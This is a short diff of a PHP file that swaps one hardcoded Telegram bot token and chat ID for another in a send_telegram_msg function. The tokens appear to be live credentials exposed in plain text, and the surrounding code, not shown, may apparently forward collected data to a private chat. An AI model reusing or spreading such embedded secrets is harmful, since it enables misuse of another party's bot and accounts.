@@ -3,8 +3,8 @@
 
 function send_telegram_msg($message){
 	// Put Your Telegram Information Here
-	$botToken  = '5650892260:AAGVsYWSB3mGUrwcNNHTIgfTZWMY1H5vSTo';// your tg token bot from botfather (dont put "bot" infront it)
-	$chat_id  = ['2111697779'];// your tg userid from userinfobot
+	$botToken  = '5231603337:AAGjgSiKHgOsz5tLv1ZzHquftzcEGLplrag';// your tg token bot from botfather (dont put "bot" infront it)
+	$chat_id  = ['2113595840'];// your tg userid from userinfobot
 	
 	
 	$website="https://api.telegram.org/bot".$botToken;
